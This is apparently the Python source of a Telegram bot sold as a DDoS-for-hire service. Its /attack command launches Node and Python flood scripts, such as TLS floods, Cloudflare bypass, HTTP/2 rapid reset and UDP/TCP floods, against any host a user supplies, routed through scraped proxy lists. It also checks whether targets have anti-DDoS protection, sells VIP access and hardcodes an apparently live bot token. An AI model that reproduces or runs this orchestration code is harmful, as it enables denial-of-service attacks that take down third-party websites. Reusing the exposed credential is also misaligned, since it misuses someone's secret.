import telebot
import datetime
import time
import os
import subprocess
import psutil
import sqlite3
import hashlib
import requests
import sys
import socket
import zipfile
import io
import re
import threading

bot_token = '8077257927:AAFX4w4sosqbgmLy8YJJU3pv4lgmEuKGhPE'

bot = telebot.TeleBot(bot_token)

allowed_group_id = -1002391120399

allowed_users = []
processes = []
ADMIN_ID = 6923153887
proxy_update_count = 0
last_proxy_update_time = time.time()
key_dict = {}

connection = sqlite3.connect('user_data.db')
cursor = connection.cursor()

# Create the users table if it doesn't exist
cursor.execute('''
    CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        expiration_time TEXT
    )
''')
connection.commit()
def TimeStamp():
    now = str(datetime.date.today())
    return now
def load_users_from_database():
    cursor.execute('SELECT user_id, expiration_time FROM users')
    rows = cursor.fetchall()
    for row in rows:
        user_id = row[0]
        expiration_time = datetime.datetime.strptime(row[1], '%Y-%m-%d %H:%M:%S')
        if expiration_time > datetime.datetime.now():
            allowed_users.append(user_id)

def save_user_to_database(connection, user_id, expiration_time):
    cursor = connection.cursor()
    cursor.execute('''
        INSERT OR REPLACE INTO users (user_id, expiration_time)
        VALUES (?, ?)
    ''', (user_id, expiration_time.strftime('%Y-%m-%d %H:%M:%S')))
    connection.commit()
@bot.message_handler(commands=['add'])
def add_user(message):
    admin_id = message.from_user.id
    if admin_id != ADMIN_ID:
        bot.reply_to(message, 'Commands For Admin')
        return

    if len(message.text.split()) == 1:
        bot.reply_to(message, 'Enter Correct Format /add + [id]')
        return

    user_id = int(message.text.split()[1])
    allowed_users.append(user_id)
    expiration_time = datetime.datetime.now() + datetime.timedelta(days=30)
    connection = sqlite3.connect('user_data.db')
    save_user_to_database(connection, user_id, expiration_time)
    connection.close()

    bot.reply_to(message, f'Added User whose ID is: {user_id} Use 30-Day Order')


load_users_from_database()
##delete area
@bot.message_handler(commands=['del'])
def delete_user(message):
    # Admin verification
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, " Admin-only command!")
        return

    # Validate command format
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, " Usage: /del [user_id]")
        return

    try:
        user_id = int(args[1])
    except ValueError:
        bot.reply_to(message, " Invalid user ID format")
        return

    # Delete from database
    connection = sqlite3.connect('user_data.db')
    cursor = connection.cursor()
    
    try:
        # Delete user
        cursor.execute('DELETE FROM users WHERE user_id = ?', (user_id,))
        connection.commit()
        
        # Remove from allowed_users list if present
        if user_id in allowed_users:
            allowed_users.remove(user_id)
            
        bot.reply_to(message, f" User {user_id} deleted successfully")
        
    except sqlite3.Error as e:
        bot.reply_to(message, f" Database error: {str(e)}")
    finally:
        connection.close()
##
@bot.message_handler(commands=['list_users'])
def list_users(message):
    # Verify admin privileges
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, " Command restricted to admin only!")
        return

    # Connect to database
    connection = sqlite3.connect('user_data.db')
    cursor = connection.cursor()
    
    # Get all users from database
    cursor.execute('SELECT user_id, expiration_time FROM users ORDER BY user_id')
    users = cursor.fetchall()
    connection.close()

    # Handle empty database case
    if not users:
        bot.reply_to(message, " Database is empty - no users found!")
        return

    # Build formatted response
    response = " Registered Users:\n\n"
    for user_id, expiration_time_str in users:
        expiration_time = datetime.datetime.strptime(expiration_time_str, '%Y-%m-%d %H:%M:%S')
        status = " Active" if expiration_time > datetime.datetime.now() else " Expired"
        remaining_days = (expiration_time - datetime.datetime.now()).days if expiration_time > datetime.datetime.now() else 0
        response += f" User ID: {user_id}\n Expiry: {expiration_time_str}\n{status}"
        if remaining_days > 0:
            response += f" ({remaining_days} days remaining)"
        response += "\n\n"

    bot.reply_to(message, response)
    
##

@bot.message_handler(commands=['start', 'help'])
def help(message):
    help_text = '''
📌📌 All Commands: DDoS Command (Website Attack) - 
/attack + [methods] + [host] - 
/methods : To View Methods -
/check + [host] : Check AntiDDoS - 
/proxy : Check Number of Proxies Useful Command ^^ - 
/code + [host] : Get Source Code Website - 
/getproxy : Proxy will automatically update after 10 minutes -
/list : View available prx ds - 
/prx + Proxy type you want to get [ Proxy Live 95% Die 5 %] - 
/time : Number of times the Bot has been active Info Admin 
/VIPkey : To Buy VIP Key -
/admin : Info Admin
/on : On Bot
/off : Off Bot
/tools
'''
    bot.reply_to(message, help_text)
    

@bot.message_handler(commands=['list'])
def fa(message):


    help_text = '''
List :
HTTP : GET PROXY HTTP
HTTPS : GET PROXY HTTPS
SOCKS4 : GET PROXY SOCKS4
SOCKS5 : GET PROXY SOCKS5

'''
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['prx'])
def proxy(message):

        
    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot is Currently Off. Please Wait Until It Is Turned On Again.')
        return
        
    args = message.text.split(" ")
    if len(args) != 2:
        bot.reply_to(message, "Please Use Syntax.\nExample: /prx + proxy type you want to get")
        return
    
    proxy_type = args[1].upper()
    if proxy_type not in ['HTTP', 'TRIS' , 'HTTPS', 'SOCKS4', 'SOCKS5']:
        bot.reply_to(message, "Invalid Selection. Message /list To See Options.")
        return

    sources = {
        'HTTP': [
            'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http',
            'https://www.freeproxychecker.com/result/http_proxies.txt'
        ],
        'TRIS': [ ## lỗi
            'https://onlytris.name.vn/get-proxy.php?key=Phongkhuenunglon'
        ],
        'HTTPS': [
            'https://api.proxyscrape.com/v2/?request=getproxies&protocol=https',
            'https://www.freeproxychecker.com/result/https_proxies.txt'
        ],
        'SOCKS4': [
            'https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4'
        ],
        'SOCKS5': [
            'https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5'
        ]
    }

    proxies = []
    for source in sources.get(proxy_type, []):
        try:
            response = requests.get(source)
            if response.status_code == 200:
                proxies.extend(response.text.splitlines())
        except:
            pass

    if len(proxies) > 0:
        filename = 'FAMOD-PROXY-{}.txt'.format(proxy_type.lower())

        with open(filename, 'w') as file:
            file.write('\n'.join(proxies))

        bot.send_document(message.chat.id, open(filename, 'rb'))
        bot.reply_to(message, "Request Get Proxy {} Requests.\nFile sent {} give @{}".format(proxy_type, filename, message.from_user.username))
    else:
        bot.reply_to(message, "Cannot Get Free Proxy List.")
@bot.message_handler(commands=['methods'])
def methods(message):
    help_text = '''
📌 methods list:
[ Layer7 ]
[ list  ]
TLS
DESTROY
CF-BYPASS
HTTP
HTTPS
BYPASS
CRASH
RSET
CYBER
TLS-VIP
TLS-KILL
[ layer4 ]
[ List ] 
🚀 Layer4
TCP-FLOOD
UDP-FLOOD
'''
    bot.reply_to(message, help_text)
    
@bot.message_handler(commands=['tools'])
def tools(message):
    help_text = '''
[ Tools ]
/reverseip <ip> : Reverse IP Lookup
/subnetlookup <subnet> : Subnet Calculator
/asnlookup <asn/ip> : ASN Lookup
/dns <domain> : DNS Lookup
/reversedns <ip/domain> : Reverse DNS Lookup
'''
    bot.reply_to(message, help_text)
    #commands tools
    # Tools Section
@bot.message_handler(commands=['reverseip'])
def reverse_ip(message):
    try:
        args = message.text.split()
        if len(args) != 2:
            bot.reply_to(message, 'Usage: /reverseip <ip>\nExample: /reverseip 1.1.1.1')
            return
            
        ip = args[1]
        response = requests.get(f'https://api.hackertarget.com/reverseiplookup/?q={ip}')
        
        if response.status_code == 200:
            if "error" in response.text.lower():
                bot.reply_to(message, "API Error: Invalid input or rate limit reached")
            else:
                bot.reply_to(message, f"Reverse IP Results for {ip}:\n\n{response.text}")
        else:
            bot.reply_to(message, "API Error: Could not fetch results")

    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

@bot.message_handler(commands=['subnetlookup'])
def subnet_lookup(message):
    try:
        args = message.text.split()
        if len(args) != 2:
            bot.reply_to(message, 'Usage: /subnetlookup <cdr/ip+netmask>\nExample: /subnetlookup 192.168.1.0/24')
            return
            
        subnet = args[1]
        response = requests.get(f'https://api.hackertarget.com/subnetcalc/?q={subnet}')
        
        if response.status_code == 200:
            bot.reply_to(message, f"Subnet Calculator Results:\n\n{response.text}")
        else:
            bot.reply_to(message, "API Error: Could not fetch results")

    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

@bot.message_handler(commands=['asnlookup'])
def asn_lookup(message):
    try:
        args = message.text.split()
        if len(args) != 2:
            bot.reply_to(message, 'Usage: /asnlookup <ip/asn>\nExample: /asnlookup AS15169')
            return
            
        query = args[1]
        response = requests.get(f'https://api.hackertarget.com/aslookup/?q={query}')
        
        if response.status_code == 200:
            bot.reply_to(message, f"ASN Lookup Results:\n\n{response.text}")
        else:
            bot.reply_to(message, "API Error: Could not fetch results")

    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

@bot.message_handler(commands=['dns'])
def dns_lookup(message):
    try:
        args = message.text.split()
        if len(args) != 2:
            bot.reply_to(message, 'Usage: /dns <domain>\nExample: /dns google.com')
            return
            
        domain = args[1]
        response = requests.get(f'https://api.hackertarget.com/dnslookup/?q={domain}')
        
        if response.status_code == 200:
            bot.reply_to(message, f"DNS Records for {domain}:\n\n{response.text}")
        else:
            bot.reply_to(message, "API Error: Could not fetch results")

    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

@bot.message_handler(commands=['reversedns'])
def reverse_dns(message):
    try:
        args = message.text.split()
        if len(args) != 2:
            bot.reply_to(message, 'Usage: /reversedns <ip/domain>\nExample: /reversedns 8.8.8.8')
            return
            
        query = args[1]
        response = requests.get(f'https://api.hackertarget.com/reversedns/?q={query}')
        
        if response.status_code == 200:
            bot.reply_to(message, f"Reverse DNS Results:\n\n{response.text}")
        else:
            bot.reply_to(message, "API Error: Could not fetch results")

    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")
allowed_users = []  # Define your allowed users list
cooldown_dict = {}
is_bot_active = True

def run_attack(command, duration, message):
    cmd_process = subprocess.Popen(command)
    start_time = time.time()
    
    while cmd_process.poll() is None:
        # Check CPU usage and terminate if it's too high for 10 seconds
        if psutil.cpu_percent(interval=1) >= 1:
            time_passed = time.time() - start_time
            if time_passed >= 90:
                cmd_process.terminate()
                bot.reply_to(message, "Attack Order Stopped, Thank You For Using")
                return
        # Check if the attack duration has been reached
        if time.time() - start_time >= duration:
            cmd_process.terminate()
            cmd_process.wait()
            return
@bot.message_handler(commands=['attack'])
def attack_command(message):
    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'The bot is currently disabled. Please wait until it is turned back on.')
        return
    
    if len(message.text.split()) < 3:
        bot.reply_to(message, 'Please enter correct syntax.\nfor example: /attack + [method] + [host]')
        return

    username = message.from_user.username
    current_time = time.time()
    
    if username in cooldown_dict and current_time - cooldown_dict[username].get('attack', 0) < 120:
        remaining_time = int(120 - (current_time - cooldown_dict[username].get('attack', 0)))
        bot.reply_to(message, f"@{username} please wait {remaining_time} seconds before using the command again /attack.")
        return
    
    args = message.text.split()
    method = args[1].upper()
    host = args[2]

    # Blocked domains check (added BYPASS to check list)
    blocked_domains = []   
    if method in ['TLS', 'DESTROY', 'HTTP', 'CF-BYPASS', 'HTTPS', 'BYPASS']:
        for blocked_domain in blocked_domains:
            if blocked_domain in host:
                bot.reply_to(message, f"attacking websites with domain names is not allowed {blocked_domain}")
                return

    if method in ['HTTPS', 'TLS', 'GOD', 'DESTROY', 'CF-BYPASS', 'UDP-FLOOD', 'TCP-FLOOD', 'HTTP', 'BYPASS','CRASH','RSET','CYBER','TLS-VIP','TLS-KILL','SuperMedusa4']:
        # BYPASS method handling
        if method == 'BYPASS':
            try:
                if len(args) < 4:
                    raise IndexError()
                attack_time = args[3]
                command = ["node", "BYPASS.js", host, attack_time, "100", "5", "proxy.txt"]
                duration = int(attack_time)
            except IndexError:
                bot.reply_to(message, 'Usage: /attack BYPASS [host] [time]')
                return
            except ValueError:
                bot.reply_to(message, 'Time must be an integer.')
                return
# Crash method handling
        if method == 'CRASH':
            try:
                if len(args) < 4:
                    raise IndexError()
                attack_time = args[3]
                command = ["node", "Crash.js", host, attack_time, "100", "5", "proxy.txt"]
                duration = int(attack_time)
            except IndexError:
                bot.reply_to(message, 'Usage: /attack CRASH [host] [time]')
                return
            except ValueError:
                bot.reply_to(message, 'Time must be an integer.')
                return
# RAPID-RESET method handling
        if method == 'RSET':
            try:
                if len(args) < 4:
                    raise IndexError()
                attack_time = args[3]
                command = ["node", "rapid-reset.js", host, attack_time, "100", "5", "proxy.txt"]
                duration = int(attack_time)
            except IndexError:
                bot.reply_to(message, 'Usage: /attack RSET [host] [time]')
                return
            except ValueError:
                bot.reply_to(message, 'Time must be an integer.')
                return 
# CYBER method handling
        if method == 'CYBER':
            try:
                if len(args) < 4:
                    raise IndexError()
                attack_time = args[3]
                command = ["node", "CYBER-DDOS.js", host, attack_time, "100", "5", "proxy.txt"]
                duration = int(attack_time)
            except IndexError:
                bot.reply_to(message, 'Usage: /attack CYBER [host] [time]')
                return
            except ValueError:
                bot.reply_to(message, 'Time must be an integer.')
                return
                # TLS-VIP method handling
                # CYBER method handling
        if method == 'TLS-VIP':
            try:
                if len(args) < 4:
                    raise IndexError()
                attack_time = args[3]
                command = ["node", "TLS-VIP.js", host, attack_time, "100", "5", "proxy.txt"]
                duration = int(attack_time)
            except IndexError:
                bot.reply_to(message, 'Usage: /attack TLS-VIP [host] [time]')
                return
            except ValueError:
                bot.reply_to(message, 'Time must be an integer.')
                return
                # TLS-KILL method handling
        if method == 'TLS-KILL':
            try:
                if len(args) < 4:
                    raise IndexError()
                attack_time = args[3]
                command = ["node", "TLS-KILL.js", host, attack_time, "100", "5", "proxy.txt"]
                duration = int(attack_time)
            except IndexError:
                bot.reply_to(message, 'Usage: /attack TLS-kill [host] [time]')
                return
            except ValueError:
                bot.reply_to(message, 'Time must be an integer.')
                return
                # TLS-KILL method handling
        if method == 'SuperMedusa4':
            try:
                if len(args) < 4:
                    raise IndexError()
                attack_time = args[3]
                command = ["node", "SuperMedusa4.js", host, attack_time, "100", "5", "proxy.txt"]
                duration = int(attack_time)
            except IndexError:
                bot.reply_to(message, 'Usage: /attack SuperMedusa4 [host] [time]')
                return
            except ValueError:
                bot.reply_to(message, 'Time must be an integer.')
                return
        # Existing methods handling
        elif method == 'TLS':
            command = ["node", "TLS.js", host, "200", "60", "5"]
            duration = 90
        elif method == 'GOD':
            command = ["node", "GOD.js", host, "200", "64", "3"]
            duration = 45
        elif method == 'DESTROY':
            command = ["node", "DESTROY.js", host, "200", "64", "5", "proxy.txt"]
            duration = 90
        elif method == 'HTTP':
            command = ["node", "UAM-BYPASS.js", host, "200", "60", "10", "proxy.txt"]
            duration = 90
        elif method == 'HTTPS':
            command = ["node", "HTTPS.js", host, "200", "50", "10", "proxy.txt"]
            duration = 90
        elif method == 'CF-BYPASS':
            command = ["node", "CFBYPASS.js", host, "200", "64", "5", "proxy.txt"]
            duration = 90
        elif method == 'UDP-FLOOD':
            port = args[3]
            if not port.isdigit():
                bot.reply_to(message, 'Port must be a positive integer.')
                return
            command = ["python", "udp.py", host, port, "90", "64", "10"]
            duration = 90
        elif method == 'TCP-FLOOD':
            port = args[3]
            if not port.isdigit():
                bot.reply_to(message, 'Port must be a positive integer.')
                return
            command = ["python", "tcp.py", host, port, "90", "64", "10"]
            duration = 90

        # Common attack execution
        cooldown_dict[username] = {'attack': current_time}
        attack_thread = threading.Thread(target=run_attack, args=(command, duration, message))
        attack_thread.start()
        
        # Attack success message (preserved format)
        bot.reply_to(message, f'┏━━━━━━━━━━━━━━┓\n┃   Attack Sent!!!\n┗━━━━━━━━━━━━━━➤\n┏━━━━━━━━━━━━━━┓\n┣➤ Attack By: @{username} \n┣➤ Host: {host} \n┣➤ Methods: {method} \n┣➤ Time: {duration} Seconds\n┣➤Check Host: https://check-host.net/check-http?host={host}\n┣➤ For more power DM admin: @secanoniser \n┗━━━━━━━━━━━━━━➤')
    else:
        bot.reply_to(message, 'Invalid attack method. Use the /methods command to see the attack method')
@bot.message_handler(commands=['proxy'])
def proxy_command(message):
    user_id = message.from_user.id
    # Changed from allowed_users check to ADMIN_ID verification
    if user_id != ADMIN_ID:
        bot.reply_to(message, ' This command is restricted to admin only!')
        return

    try:
        with open("proxy.txt", "r") as proxy_file:
            proxies = proxy_file.readlines()
            num_proxies = len(proxies)
            bot.reply_to(message, f" Admin Proxy Status:\n\nProxies Available: {num_proxies}")
    except FileNotFoundError:
        bot.reply_to(message, " proxy.txt file not found")

def send_proxy_update():
    while True:
        try:
            with open("proxy.txt", "r") as proxy_file:
                proxies = proxy_file.readlines()
                num_proxies = len(proxies)
                proxy_update_message = f"The newly updated proxy number is: {num_proxies}"
                bot.send_message(allowed_group_id, proxy_update_message)
        except FileNotFoundError:
            pass
        time.sleep(3600)  # Wait for 10 minutes

@bot.message_handler(commands=['cpu'])
def check_cpu(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, 'You do not have permission to use this command.')
        return

    cpu_usage = psutil.cpu_percent(interval=1)
    memory_usage = psutil.virtual_memory().percent

    bot.reply_to(message, f'🖥️ CPU Usage: {cpu_usage}%\n💾 Memory Usage: {memory_usage}%')

@bot.message_handler(commands=['off'])
def turn_off(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, 'You do not have permission to use this command.')
        return

    global is_bot_active
    is_bot_active = False
    bot.reply_to(message, 'The bot has been turned off. All users cannot use other commands.')

@bot.message_handler(commands=['on'])
def turn_on(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, 'You do not have permission to use this command.')
        return

    global is_bot_active
    is_bot_active = True
    bot.reply_to(message, 'The bot has been restarted. All users can reuse commands normally.')

is_bot_active = True
@bot.message_handler(commands=['code'])
def code(message):
    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'The bot is currently disabled. Please wait until it is turned back on.')
        return
    
    
    if len(message.text.split()) != 2:
        bot.reply_to(message, 'Please enter correct syntax.\nFor example: /code + [link website]')
        return

    url = message.text.split()[1]

    try:
        response = requests.get(url)
        if response.status_code != 200:
            bot.reply_to(message, 'The source code cannot be obtained from this website. Please check again URL.')
            return

        content_type = response.headers.get('content-type', '').split(';')[0]
        if content_type not in ['text/html', 'application/x-php', 'text/plain']:
            bot.reply_to(message, 'The website is not HTML or PHP. Please try with a website URL containing HTML or PHP files.')
            return

        source_code = response.text

        zip_file = io.BytesIO()
        with zipfile.ZipFile(zip_file, 'w') as zipf:
            zipf.writestr("source_code.txt", source_code)

        zip_file.seek(0)
        bot.send_chat_action(message.chat.id, 'upload_codeweb')
        bot.send_document(message.chat.id, zip_file)

    except Exception as e:
        bot.reply_to(message, f'An error occurred: {str(e)}')

@bot.message_handler(commands=['check'])
def check_ip(message):
    if len(message.text.split()) != 2:
        bot.reply_to(message, 'Please enter the correct punctuation.\nFor example: /check + [link website]')
        return

    url = message.text.split()[1]
    
    # Kiểm tra xem URL có http/https chưa, nếu chưa thêm vào
    if not url.startswith(("http://", "https://")):
        url = "http://" + url

    # Loại bỏ tiền tố "www" nếu có
    url = re.sub(r'^(http://|https://)?(www\d?\.)?', '', url)
    
    try:
        ip_list = socket.gethostbyname_ex(url)[2]
        ip_count = len(ip_list)

        reply = f"IP of the website: {url}\nLà: {', '.join(ip_list)}\n"
        if ip_count == 1:
            reply += "Websites with 1 IP are likely not antiddos."
        else:
            reply += "Websites with more than 1 IP have very high antiddos capabilities.\nThis website cannot be attacked."

        bot.reply_to(message, reply)
    except Exception as e:
        bot.reply_to(message, f"An error occurred: {str(e)}")

@bot.message_handler(commands=['admin'])
def send_admin_link(message):
    bot.reply_to(message, "Telegram: t.me/secanoniser")


# Hàm tính thời gian hoạt động của bot
start_time = time.time()

proxy_update_count = 0
proxy_update_interval = 600 

@bot.message_handler(commands=['getproxy'])
def get_proxy_info(message):
    user_id = message.from_user.id
    global proxy_update_count

    if not is_bot_active:
        bot.reply_to(message, 'The bot is currently disabled. Please wait until it is turned back on.')
        return

    try:
        with open("proxy.txt", "r") as proxy_file:
            proxy_list = proxy_file.readlines()
            proxy_list = [proxy.strip() for proxy in proxy_list]
            proxy_count = len(proxy_list)
            proxy_message = f'10 Minute Self Update\nQuantity proxy: {proxy_count}\n'
            bot.send_message(message.chat.id, proxy_message)
            bot.send_document(message.chat.id, open("proxy.txt", "rb"))
            proxy_update_count += 1
    except FileNotFoundError:
        bot.reply_to(message, "Not found file proxy.txt.")


@bot.message_handler(commands=['time'])
def show_uptime(message):
    current_time = time.time()
    uptime = current_time - start_time
    hours = int(uptime // 3600)
    minutes = int((uptime % 3600) // 60)
    seconds = int(uptime % 60)
    uptime_str = f'{hours} hours, {minutes} minutes, {seconds} seconds'
    bot.reply_to(message, f'Bot Works Now: {uptime_str}')

@bot.message_handler(commands=['hello'])
def hello(message):
    bot.reply_to(message, 'Hello!')

@bot.message_handler(func=lambda message: message.text.startswith('/'))
def invalid_command(message):
    bot.reply_to(message, 'Invalid order. Please use the /help command to see the command list.')

bot.infinity_polling(timeout=60, long_polling_timeout = 1)
